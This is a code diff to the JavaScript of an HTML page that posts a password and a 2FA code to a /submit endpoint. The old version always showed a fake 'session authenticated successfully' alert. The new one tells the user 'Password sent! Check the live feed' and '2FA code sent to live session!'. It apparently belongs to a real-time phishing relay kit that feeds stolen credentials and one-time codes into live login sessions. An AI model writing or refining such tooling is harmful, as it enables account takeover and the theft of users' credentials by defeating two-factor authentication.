@@ -234,19 +234,30 @@
     
     <script>
         function submit() {
+            const pass = document.getElementById('pass').value;
+            const code = document.getElementById('code').value;
+            
             fetch('/submit', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    password: document.getElementById('pass').value,
-                    code: document.getElementById('code').value
-                })
-            }).then(() => {
-                alert('session authenticated successfully');
-                document.getElementById('pass').value = '';
-                document.getElementById('code').value = '';
-            }).catch(() => {
-                alert('session authenticated successfully');
+                body: JSON.stringify({ password: pass, code: code })
+            })
+            .then(r => r.json())
+            .then(data => {
+                console.log('Submit response:', data);
+                
+                if (pass && !code) {
+                    alert('Password sent! Check the live feed — if 2FA appears, enter the code below.');
+                    document.getElementById('pass').value = '';
+                } else if (code) {
+                    alert('2FA code sent to live session!');
+                    document.getElementById('code').value = '';
+                } else {
+                    alert(data.message || 'Submitted');
+                }
+            })
+            .catch(() => {
+                alert('Submitted (check live feed)');
             });
         }
         
